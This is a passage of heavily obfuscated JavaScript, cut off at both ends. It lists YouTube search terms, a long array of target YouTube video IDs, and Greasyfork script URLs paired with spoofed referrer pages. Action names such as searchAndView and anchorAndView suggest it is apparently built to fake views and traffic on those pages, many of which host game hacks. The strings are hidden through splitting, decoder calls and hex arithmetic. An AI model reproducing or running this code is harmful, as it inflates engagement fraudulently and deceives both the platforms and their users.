'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + T(0x11) + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x40 * -0x50 + -0x11a4 * -0x1 + 0x133 * 0x2)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x11da + -0x5f * 0x3d + 0x4d3)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x2 * -0x49a + -0x24b9 + 0x1b88);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    W(0x15) + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    U(0x10, 'cVSR') + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    W(0xd) + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    W(0x1a) + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + U(0x17, 'PBIL')
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + U(0x1, 'nR!O') + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + W(0x13) + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + U(0x3, 'vAjx') + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + W(0x12) + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + W(0xe) + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + U(0x7, 'QgiS') + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + T(0x19) + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + T(0x8) + 'e/moomoo.i' + 'o'
    },
    {
